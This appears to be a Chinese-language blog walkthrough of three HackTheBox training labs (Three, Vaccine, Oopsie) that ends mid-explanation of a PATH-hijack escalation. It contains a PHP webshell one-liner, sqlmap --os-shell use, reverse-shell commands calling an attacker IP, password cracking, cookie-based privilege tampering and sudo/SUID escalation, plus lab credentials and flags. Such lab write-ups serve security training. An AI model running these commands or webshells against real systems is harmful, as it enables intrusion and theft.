---
title: HackTheBox记录
published: 2026-06-16T13:00:00
description: hackthebox靶场记录，持续更新。
tags:
  - HackTheBox
category: 网络安全
draft: false
---

# 靶场通关记录

# 靶场：Three(Linux)

## Task 1

How many TCP ports are open?  

端口扫描：
**-sC**  使用默认脚本扫描
**-sV**  探测服务/版本信息
```
nmap -sC -sV 10.129.227.248
```

使用无ping扫描：
```
nmap -Pn 10.129.227.248
```

注意到回显结果
```
└─$ nmap -Pn 10.129.227.248
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-15 23:04 -0400
Nmap scan report for bogon (10.129.227.248)
Host is up (0.40s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

answer：2

## Task 2

What is the domain of the email address provided in the "Contact" section of the website?

直接访问ip进行查找

answer：thetoppers.htb

## Task 3

In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames?
在没有DNS服务器的情况下，我们可以使用哪个Linux文件来解析主机名到IP地址，以便访问指向这些主机名的网站？

修改hosts文件，将域名与IP对应
```
┌──(kali㉿kali)-[~/Desktop]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters


10.129.227.248 thetoppers.htb

```

**本地静态解析**主机名（或域名）到 IP 地址，优先级**高于 DNS**（系统会先查 hosts 文件，如果找到映射就直接使用，不再查询 DNS）。

answer：/etc/hosts

## Task 4

Which sub-domain is discovered during further enumeration?

使用fuff扫描子域名

**前置**：
安装seclists，这样会有几个特定用途的字典
```
sudo apt update
sudo apt install seclists -y
ls -l /usr/share/seclists
```
**参数**：
1. `-c`：表示对HTTP响应代码进行自动匹配和过滤，只显示有效的响应。
2. `-w ./dict.txt`：指定字典文件，用于枚举URL路径
3. `-u 'http://192.168.198.12?FUZZ=/etc'`：指定目标URL，其中 ==`FUZZ`是ffuf的关键词，代表需要替换的位置，这里用它替换了URL路径的一部分，即 `/etc`。ffuf会把字典中的每个元素替换到 `FUZZ` 位置并访问相应的URL。==
4. `-H 'Host: FUZZ.example.com'`：修改 Host 头，发现同一 IP 下的不同子域名。==其他用法还可以修改**指定认证信息**、**伪造客户端标识**、**自定义 Cookie**、**指定内容类型**==
5. `-fs 0,8`：过滤响应大小，这里表示只显示响应大小在0到8字节之间的结果。这个参数可以帮助过滤掉不必要的响应。==一般是初次扫过后，大致判断无用的响应后的大小再过滤==。
6. `-ac` ：该参数的工作流程分为三步：
   **发送探测包**：在正式扫描前，`ffuf` 会先向目标发送一个**几乎不可能存在的随机字符串**（例如 `fsd8f7s9f`）作为请求。
   **建立响应基线**：分析刚才那个"不存在"请求返回的**特征**。这包括响应的状态码（如 200）、内容大小（Content-Length）、字数、行数等。
   **自动创建过滤器**：根据这个基线，`ffuf` 会自动生成一套过滤规则。在后续扫描中，**任何与基线响应特征相同的结果都会被自动隐藏**。
```
┌──(kali㉿kali)-[~/Desktop]
└─$ ffuf -u http://thetoppers.htb -H "Host: FUZZ.thetoppers.htb" \      
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -mc all -o scan.json -of json

┌──(kali㉿kali)-[~/Desktop]
└─$ cat scan.json | jq -r '.results[] | select(.length == 306) | .input.FUZZ' 

gc._msdcs

┌──(kali㉿kali)-[~/Desktop]
└─$ cat scan.json | jq -r '.results[] | select(.length == 21) | .input.FUZZ'
 
s3

```

或者使用gobuster
```
gobuster vhost -u http://thetoppers.htb -w /usr/share/seclists/Discovery/DNS /subdomains-top1million-20000.txt --append-domain

```

之后将s3添加到/etc/hosts

**参数**：
1. `tee`：同时输出到文件和屏幕，既能写入文件，又能显示在终端。
2. `-a`：在文件**末尾添加**，而不是覆盖整个文件。
```
┌──(kali㉿kali)-[~/Desktop]
└─$ echo "10.129.227.248 s3.thetoppers.htb" | sudo tee -a /etc/hosts        
10.129.227.248 s3.thetoppers.htb

```

answer：s3.thetoppers.htb

## Task 5

Which service is running on the discovered sub-domain?

子领域（s3.）的前缀是一个非常重要的线索。试着在谷歌搜索“s3 service”，了解哪家主要公司提供这项技术。提交标记时，您需要同时提供公司名称和服务名称

answer：Amazon S3

## Task 6

Which command line utility can be used to interact with the service running on the discovered sub-domain?

在Linux中使用Amazon S3经常使用 AWS CLI 进行对象管理，所以在这里需要下载AWS CLI

answer：awscli

## Task 7

Which command is used to set up the AWS CLI installation?

以下为官方文档解释：
运行此命令可快速设置和查看凭证、区域和输出格式。以下示例显示了示例值。
```
$ aws configure
AWS Access Key ID [None]: 
AWS Secret Access Key [None]: 
Default region name [None]:
Default output format [None]: 

```

answer：aws configure

## Task 8

What is the command used by the above utility to list all of the S3 buckets?

查阅官方文档，需要先进行配置，也就是上一步的操作，随便填写，之后在官方文档中找出S3的命令示例

**参数**：
`--endpoint-url<string> `
指定要将请求发送到的 URL。对于大多数命令，AWS CLI 会根据所选服务和指定的 AWS 区域自动确定 URL。但是，某些命令需要您指定账户专用 URL。您还可以配置一些 AWS 服务直接在您的私有 VPC 中托管端点（然后可能需要指定该端点）。

所以在命令中需要指定到本地的s3服务

```
┌──(kali㉿kali)-[~/Desktop]
└─$ aws --endpoint=http://s3.thetoppers.htb s3 ls
2026-06-15 22:57:48 thetoppers.htb
                                                                             
┌──(kali㉿kali)-[~/Desktop]
└─$ aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
                           PRE images/
2026-06-15 22:57:48          0 .htaccess
2026-06-15 22:57:48      11952 index.php

```

answer：aws s3 ls

## Task 9

This server is configured to run files written in what web scripting language?

答案在上题中已经很明显了

answer：PHP

## Task 10

Submit the flag located in /var/www/.

官方文档指出以下 `cp` 命令会将单个文件复制到指定的存储桶和密钥

```
┌──(kali㉿kali)-[~/Desktop]
└─$ echo '<?php system($_GET["cmd"]); ?>' > webshell.php  

┌──(kali㉿kali)-[~/Desktop]
└─$ aws --endpoint=http://s3.thetoppers.htb s3 cp webshell.php s3://thetoppers.htb
upload: ./webshell.php to s3://thetoppers.htb/webshell.php    

┌──(kali㉿kali)-[~/Desktop]
└─$ aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
                           PRE images/
2026-06-15 22:57:48          0 .htaccess
2026-06-15 22:57:48      11952 index.php
2026-06-16 01:05:58         31 webshell.php

```

url：`http://thetoppers.htb/webshell.php?cmd=ls ../`，发现存在flag.txt

url：`http://thetoppers.htb/webshell.php?cmd=cat ../flag.txt`，拿到flag

answer：a980d99281a28d638ac68b9bf9453c2b

# 靶场：Vaccine(Linux)

## Task 1

Besides SSH and HTTP, what other service is hosted on this box?

```
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -sC -sV 10.129.95.174
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-16 09:29 -0400
Nmap scan report for 10.129.95.174
Host is up (0.42s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.17.123
|      Logged in as ftpuser
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: MegaCorp Login
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

answer：FTP

## Task 2

This service can be configured to allow login with any password for specific username. What is that username?

```
┌──(kali㉿kali)-[~/Desktop]
└─$ ftp 10.129.95.174         
Connected to 10.129.95.174.
220 (vsFTPd 3.0.3)
Name (10.129.95.174:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 

```

answer：anonymous

## Task 3

What is the name of the file downloaded over this service?

```
ftp> ls
229 Entering Extended Passive Mode (|||10248|)
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
226 Directory send OK.

```

answer：backup.zip

## Task 4

What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts?

这个需要自行Google，外网查到的资料是：

**zip2john（zip to john）** 的核心作用是**把加密的压缩包变成密码破解工具能听懂的「数字指纹」（哈希值）**。
**开膛手（John the Ripper）** 的核心作用就是：**拿着这个「数字指纹」，在电脑里疯狂“对暗号”，把真正的密码试出来**。

answer：zip2john

## Task 5



先获取该压缩文件，尝试解压该文件发现需要密码

```
ftp> get backup.zip
local: backup.zip remote: backup.zip
229 Entering Extended Passive Mode (|||10072|)
150 Opening BINARY mode data connection for backup.zip (2533 bytes).
100% |**********************************************************************************************************************************************************************|  2533       12.58 KiB/s    00:00 ETA
226 Transfer complete.
2533 bytes received in 00:00 (3.36 KiB/s)
ftp> 

┌──(kali㉿kali)-[~/Desktop]
└─$ unzip backup.zip 
Archive:  backup.zip
[backup.zip] index.php password: 
   skipping: index.php               incorrect password
   skipping: style.css               incorrect password

```

此时使用z2john计算压缩包hash值并将结果存入文件中

```
┌──(kali㉿kali)-[~/Desktop]
└─$ zip2john backup.zip > backup.hash
Created directory: /home/kali/.john
ver 2.0 efh 5455 efh 7875 backup.zip/index.php PKZIP Encr: TS_chk, cmplen=1201, decmplen=2594, crc=3A41AE06 ts=5722 cs=5722 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/style.css PKZIP Encr: TS_chk, cmplen=986, decmplen=3274, crc=1B1CCD6A ts=989A cs=989a type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.

```

现在使用使用John开膛手核心引擎加载rockyou字典，对 ZIP 哈希进行爆破撞库

需要注意：先解压rockyou这个字典，默认是压缩包的形式

```
┌──(kali㉿kali)-[~/Desktop]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
741852963        (backup.zip)     
1g 0:00:00:00 DONE (2026-06-16 10:10) 33.33g/s 273066p/s 273066c/s 273066C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

解压目标（backup.zip）后，查看.php代码文件拿到账号和密码。账号为admin，密码经过MD5解密后为：qwerty789

```
<?php
session_start();
  if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
      $_SESSION['login'] = "true";
      header("Location: dashboard.php");
    }
  }
  
```

或者将密码复制并单独存放一个文件，使用hashcat枚举密码 
**参数**：
1. `-a`： --attack-mode=NUM 攻击模式，0 = 字典攻击，1 = 组合攻击，3 = 掩码攻击  
2. `-m`：--hash-type=NUM 哈希类别，0 = MD5

```
hashcat -a 0 -m 0 pass.txt /usr/share/wordlists/rockyou.txt

```

answer：qwerty789

## Task 6

What option can be passed to sqlmap to try to get command execution via the sql injection?

进入之后只有一个简单的界面，含有一个搜索框，于是尝试sql注入

`1' or '1' = '1' --`，发现为返回了所有数据，又尝试了确认列数，当进行到`1' order by 6--`时发生了报错，确认列数为5行，存在sql注入点

确认之后，尝试使用sqlmap对该站点进行扫描

```
┌──(kali㉿kali)-[~/Desktop]
└─$ sqlmap -u 'http://10.129.95.174/dashboard.php?search=111'  
        ___
       __H__                                                                                                                                 
 ___ ___[(]_____ ___ ___  {1.10.2#stable}                                                                                                    
|_ -| . [.]     | .'| . |                                                                                                                    
|___|_  [,]_|_|_|__,|  _|                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:52:04 /2026-06-16/

[10:52:04] [INFO] testing connection to the target URL
got a 302 redirect to 'http://10.129.95.174/index.php'. Do you want to follow? [Y/n] 

you have not declared cookie(s), while server wants to set its own ('PHPSESSID=7gipfabvt7k...slt6oshbrt'). Do you want to use those [Y/n] 

[10:52:09] [INFO] checking if the target is protected by some kind of WAF/IPS
[10:52:10] [INFO] testing if the target URL content is stable
[10:52:12] [CRITICAL] no parameter(s) found for testing in the provided data (e.g. GET parameter 'id' in 'www.site.com/index.php?id=1'). You are advised to rerun with '--forms --crawl=2'

[*] ending @ 10:52:12 /2026-06-16/

```

`got a 302 redirect to 'http://10.129.95.174/index.php'`，发现重定向到了index.php，再使用sqlmap将cookie携带进行扫描

```
┌──(kali㉿kali)-[~/Desktop]
└─$ sqlmap -u 'http://10.129.95.174/dashboard.php?search=111' --cookie='PHPSESSID=sj5r9p95lq6eegg2pli12ln96q'


sqlmap identified the following injection point(s) with a total of 49 HTTP(s) requests:
---
Parameter: search (GET)
    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: search=111';SELECT PG_SLEEP(5)--

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: search=111' UNION ALL SELECT NULL,NULL,(CHR(113)||CHR(98)||CHR(118)||CHR(122)||CHR(113))||(CHR(68)||CHR(111)||CHR(114)||CHR(78)||CHR(75)||CHR(115)||CHR(101)||CHR(69)||CHR(77)||CHR(77)||CHR(115)||CHR(79)||CHR(101)||CHR(78)||CHR(66)||CHR(112)||CHR(87)||CHR(65)||CHR(114)||CHR(82)||CHR(71)||CHR(78)||CHR(122)||CHR(102)||CHR(90)||CHR(110)||CHR(99)||CHR(100)||CHR(113)||CHR(102)||CHR(72)||CHR(85)||CHR(80)||CHR(90)||CHR(114)||CHR(80)||CHR(71)||CHR(78)||CHR(71)||CHR(119))||(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)),NULL,NULL-- EPGn
---
[11:01:02] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Ubuntu 19.10 or 20.04 or 20.10 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: PostgreSQL
[11:01:07] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.129.95.174'


```

确认search确实存在sql注入，`Type: stacked queries`说明可以进行堆叠查询，后端数据库为postgresql，目标服务器是Ubuntu，确认一下版本信息为19.10

```
┌──(kali㉿kali)-[~/Desktop]
└─$ sqlmap -u 'http://10.129.95.174/dashboard.php?search=1' --cookie='PHPSESSID=sj5r9p95lq6eegg2pli12ln96q' --sql-shell

sql-shell> select version();
[11:03:37] [INFO] fetching SQL SELECT statement query output: 'select version()'
select version(): 'PostgreSQL 11.7 (Ubuntu 11.7-0ubuntu0.19.10.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.2.1-9ubuntu2) 9.2.1 20191008, 64-bit'

```

目标是 **PostgreSQL**，而 PostgreSQL 有一个著名的命令执行方式：`COPY (SELECT '') TO PROGRAM 'whoami'`，这个功能需要**超级用户权限**，但很多管理员为了方便，直接用 `postgres` 超级用户运行数据库服务。

而**sqlmap 的 `--os-shell` 底层就是封装了这个过程**：

```
1. 创建一张临时表  
2. 用 `COPY ... FROM PROGRAM` 执行系统命令  
3. 把命令结果写入临时表  
4. 读取临时表返回给用户
   
```

针对一系列，所以需要使用到sqlmap的`--os-shell`，如果用户权限不够，这条命令会失败，获取到shell即为成功

answer：--os-shell

## Task 7

What program can the postgres user run as root using sudo?

answer在Task 9中

## Task 8

因为已经拿到shell，**根据端口开放情况选择攻击路径**

在扫描端口时发现目标的（21/22/80）开放，说明就可以进行反向shell，这里科普一下如何选择正反向连接：

1. 正向 Shell（目标监听，你连目标）
**前提**：目标必须**开放某个端口**并允许外部连接进来。

|      端口       | 能否用于正向 Shell |                          原因                          |
| :-----------: | :----------: | :--------------------------------------------------: |
| **21 (FTP)**  |     不推荐      |              FTP 服务已占用 21 端口，你无法再用它起监听               |
| **22 (SSH)**  |     不推荐      |                  SSH 已占用 22 端口，无法复用                  |
| **80 (HTTP)** |     不推荐      |                   Apache 已占用 80 端口                   |
|  **其他未开放端口**  |    **可以**    | 你可以在目标上用 nc/python 监听 4444、6666、8080 等端口，前提是防火墙没拦截入站 |

**结论**：正向 Shell 不能用这些已占用的端口，但可以用**其他未使用的端口**（比如 4444、6666、8080、8888），前提是**防火墙允许入站访问这些端口**。

2. 反向 Shell（目标连你，你监听）
**前提**：目标能够**主动向外发起 TCP 连接**。

|             端口             |   能否用于反向 Shell   |                      原因                       |
| :------------------------: | :--------------: | :-------------------------------------------: |
| **目标开放了 TCP 端口（21/22/80）** | **证明了 TCP 出站可用** |  目标能开放端口，说明它具备完整的 TCP 协议栈，**肯定能发起 TCP 出站连接**  |
|         **你的监听端口**         |      **随便选**     | 你可以用 4444、6666、80、443、53 等任意端口监听，只要目标能访问你的 IP |

对目标机的操作：

```
os-shell> bash -c 'bash -i >& /dev/tcp/10.10.17.123/4444 0>&1'

```

攻击机的操作：

```
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.17.123] from (UNKNOWN) [10.129.95.174] 38992

```

拿下shell之后，得到user的flag

```
postgres@vaccine:/home$ cd ~
cd ~
postgres@vaccine:/var/lib/postgresql$ ls
ls
11
user.txt
postgres@vaccine:/var/lib/postgresql$ cat user.txt
cat user.txt
ec9b13ca4d6229cd5cc1e09980965bf7
postgres@vaccine:/var/lib/postgresql$ 

```

answer：ec9b13ca4d6229cd5cc1e09980965bf7

## Task 9

查看网站代码，发现数据库连接配置，使用信息用ssh进行连接

```
postgres@vaccine:/var/www/html$ cat dashboard.php | grep user
cat dashboard.php | grep user
          $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");

```

```
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh postgres@10.129.95.174
The authenticity of host '10.129.95.174 (10.129.95.174)' can't be established.
ED25519 key fingerprint is: SHA256:4qLpMBLGtEbuHObR8YU15AGlIlpd0dsdiGh/pkeZYFo
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.95.174' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
postgres@10.129.95.174's password: 

```

查看当前用户的权限，`sudo -l` 的结果表明，`postgres` 用户可以通过 `sudo` 以 `root` 权限执行 `/bin/vi /etc/postgresql/11/main/pg_hba.conf`，利用 `vi` 的 `:!/bin/bash` 功能来获取一个 `root` 权限的 Shell

关于为什么能成功提取root权限的shell解释：
`vi` 这个编辑器进程，它的 **有效用户ID（EUID）是 0（root）**，在 `vi` 编辑器中，`:!` 是一个**外部命令执行功能**，而 `:!/bin/bash` 就是暂停 `vi`，执行 `/bin/bash`，启动一个新的 Shell

总结： **`sudo vi` 让 `vi` 变成 root 权限 → `:!/bin/bash` 利用 `vi` 开启一个 root 权限的新终端 → `whoami` 确认已经是 root。**

```
postgres@vaccine:~$ sudo -l
[sudo] password for postgres: 
Matching Defaults entries for postgres on vaccine:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf

postgres@vaccine:~$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf

```

**注意**：需要在 `vi` 的**命令模式**下输入`:!/bin/bash`之后回车，这个命令的意思是：**暂停 `vi` 编辑器，并启动一个 `/bin/bash` Shell**，如果返回后看到的是root@xxx即提权成功，至此成功拿下root的flag

```

root@vaccine:/var/lib/postgresql# ls
11  user.txt
root@vaccine:/var/lib/postgresql# cd /root
root@vaccine:~# ls
pg_hba.conf  root.txt  snap
root@vaccine:~# cat root.txt 
dd6e058e814260bc70e9bbdef2715849
  
```

Task 7 answer：vi

Task 9 answer：dd6e058e814260bc70e9bbdef2715849

# 靶场：Oopsie(Linux)

## Task 1

With what kind of tool can intercept web traffic?

answer：proxy

一般使用的HTTP/S流量劫持工具为BurpSuite、Yakit等

## Task 2

What is the path to the directory on the webserver that returns a login page?

先进行端口扫描，服务器开启了22 SSH服务端口和80 HTTP服务端口

```
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -sC -sV 10.129.48.69 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-16 23:50 -0400
Nmap scan report for 10.129.48.69
Host is up (0.44s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Welcome
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.18 seconds

```

访问该站，可能有价值的信息只有邮箱`admin@megacorp.com`，之后对源代码进行查看发现存在调用`/cdn-cgi/login/script.js`，直接进行访问`http://10.129.48.69/cdn-cgi/login/`发现是登录后台

answer：/cdn-cgi/login

## Task 3

What can be modified in Firefox to get access to the upload page?

因为可以使用游客身份登录，所以在此没有着急去爆破账号密码，进入网站后发现有上传接口但是只有管理员才能使用，继续查看发现其他页面中url中包含id参数，`http://10.129.48.69/cdn-cgi/login/admin.php?content=accounts&id=1`，将id修改为1之后，就出现了管理员的Access ID等信息，拿到这些信息进行抓包试试越权的方向

抓包文件上传后发送到repeater，修改关键信息
```
GET /cdn-cgi/login/admin.php?content=uploads HTTP/1.1
Host: 10.129.48.69
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://10.129.48.69/cdn-cgi/login/admin.php?
// 这里的 user=2233; role=guest修改为 user=34322; role=admin
Cookie: user=34322; role=admin
Upgrade-Insecure-Requests: 1
Priority: u=0, i

```

发现返回200 OK，直接放包进行查看成功进入文件上传页面，同理以上步骤也可以通过修改cookie处的Value也可以实现

answer：cookie

## Task 4

What is the access ID of the admin user?

在上一个步骤中已经得知了 admin 账户的Access ID为34322

answer：34322

## Task 5

On uploading a file, what directory does that file appear in on the server?

能文件上传的第一件事是干什么？！

先挂个马再说，不行再换其他的（经测试：上传之后最好在uploads目录下新建一个xxx文件夹，将webshell放在这个xxx文件夹中，避免webshell被程序删除）

**注意**：上传的时候拦截数据包也需要修改身份，上传成功后提示` The file webshell.php has been uploaded. `，现在要做的就是找到该站的文件上传的具体路径，直接使用**Gobuster**

**参数**：
1. `-u:`：指定url
2. `-w`：指定字典
3. `-x`：指定文件后缀
```
  
┌──(kali㉿kali)-[~/Desktop]
└─$ gobuster dir -u http://10.129.48.69/ -w /usr/share/wordlists/dirb/small.txt -x php

```

后面IP地址变了是因为服务器不稳定，重新开了一次

文件上传的路径为`uploads              (Status: 301) [Size: 316] [--> http://10.129.48.109/uploads/]`

answer：/uploads

## Task 6

What is the file that contains the password that is shared with the robert user?

`http://10.129.48.109/uploads/webshell.php?cmd=whoami`，之后文件路径遍历发现也没什么敏感的信息或者其他

先在webshell中ping我的攻击机ip发现可以连通，再进行端口测试，发现可以对我的kali的4444端口进行访问，那么到这里反向连接的条件就成立了

```
http://10.129.48.109/uploads/webshell.php?cmd=ping%20-c%203%2010.10.17.123

http://10.129.48.109/uploads/webshell.php?cmd=curl%20http://10.10.17.123:4444

// 攻击机回显
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.17.123] from (UNKNOWN) [10.129.48.109] 38370
GET / HTTP/1.1
Host: 10.10.17.123:4444
User-Agent: curl/7.58.0
Accept: */*

```

进行反向连接，进行抓包

对目标机的操作：若终端没有响应，可用burp进行抓包重放，**ctrl+u**对参数进行unicode编码

```
// 实际上就是bash -c 'bash -i >& /dev/tcp/10.10.17.123/4444 0>&1'
GET /uploads/s.php?cmd=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/bash%20-i%202%3E&1|nc%2010.10.17.123%204444%20%3E/tmp/f HTTP/1.1

```

对攻击机的操作：

```
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -lvnp 4444

```

连接成功后，需要找包含与Robert用户共享密码的文件，Linux中默认的用户账户信息的存储位置在`/etc/passwd`，同时因为无法补全命令等问题，需要升级为交互式的shell

交互式与非交互式shell的区别为：
1. ==交互式模式==就是shell等待你的输入，并且立即执行你提交的命令，退出后才终止 
2. ==非交互式模式==就是以shell script方式执行，shell不与你进行交互，而是读取存放在文件中的命令并执行它们，读取到结尾就终止

在靶机的shell中执行：`SHELL=/bin/bash script -q /dev/null`，执行后，你会看到Shell的提示符变得稍微“正常”一点（比如出现 `$` 或 `#`），但没有明显变化

在kali终端按Ctrl+Z，这会把你当前的`nc`会话挂起到后台，之后后在kali终端执行`stty raw -echo`，**注意**：这条命令执行后，你的Kali终端会**完全不显示任何输入**（就像卡住一样），这是正常的。最后在kali终端输入`fg`并回车，这会把挂起的`nc`会话恢复到前台

回到靶机shell中执行：`reset`，这一步会重置靶机的终端设置，可能会输出一些乱码，但最终会得到一个干净的提示符（经测试也可以不进行此操作），最后执行`export TERM=xterm`设置终端类型

因为之前在进行文件目录遍历时，有发现一个db.php文件，所以先查看这个文件有没有什么敏感信息

```
www-data@oopsie:/var/www/html/cdn-cgi/login$ cat db.php 
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>

```

answer：db.php

## Task 7

What executible is run with the option "-group bugtracker" to identify all files owned by the bugtracker group?

因为之前在`/etc/passwd`中查看到了Robert该用户的用户ID（UID）和组ID（GID），所以接下来直接查看当前用户组的执行权限

**解释**：==2>/dev/null==这里的意思是把错误输出到黑洞里面

```
find / -type f group robert 2>/dev/null

```

发现没什么信息，于是再次输入`id`进行查看，发现有附加组bugtracker

于是进行查找 `bugtracker` 组拥有的文件

```
robert@oopsie:/$ find / -group bugtracker -type f 2>/dev/null
/usr/bin/bugtracker

```

answer：find

## Task 8/9

Task 8 Q：Regardless of which user starts running the bugtracker executable, what's user privileges will use to run?

Task 9 Q：What SUID stands for?

经以上步骤，接下来查看详细的文件信息

**权限拆解部分**

|     部分     |      值       |               含义                |
| :--------: | :----------: | :-----------------------------: |
|  **文件类型**  |     `-`      |       普通文件（`d`=目录，`l`=链接）       |
| **所有者权限**  |    `rws`     | **r**（读）+ **w**（写）+ **s**（SUID） |
|  **组权限**   |    `r-x`     |       **r**（读）+ **x**（执行）       |
| **其他用户权限** |    `r--`     |            **r**（读）             |
|  **所有者**   |    `root`    |          文件属于 root 用户           |
|  **所属组**   | `bugtracker` |        文件属于 bugtracker 组        |

发现`-rwsr-xr--` 中的 `s` 出现在**所有者权限**位置（`rws`），这表示：**SUID（Set owner User ID up on execution）已设置**，而SUID的作用就是，当普通用户执行这个文件时，**进程的有效用户ID（EUID）会变成文件所有者（root）**，而不是执行者（robert）；简单说：**robert 执行这个程序时，程序会以 root 权限运行**

```
robert@oopsie:/$ ls -la /usr/bin/bugtracker 
-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker

```

Task 8 answer：root

Task 9 answer：Set Owner User ID

## Task 10

What is the name of the executable being called in an insecure manner?

因为Robert属于bugtracker组，所以有执行权限，输入bugtracker执行该命令，并进行测试id（随意），这里也可以通过`strings /usr/bin/bugtracker`，查看文件内容，其中就包括`cat /root/reports/`

```
robert@oopsie:/$ bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 6666
---------------

cat: /root/reports/6666: No such file or directory

```

注意到cat: /root/reports/6666，该命令使用cat来寻找该文件，并打印文件，但cat命令依赖path环境变量

输出一下环境变量

```
robert@oopsie:/$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games

```

在环境目录添加一个恶意的cat命令，造成权限提升，以root权限启动交互式 Shell

**流程**：
1. robert 执行 /usr/bin/bugtracker
2. bugtracker 程序内部执行 system("cat /root/flag.txt")    // 没有绝对路径
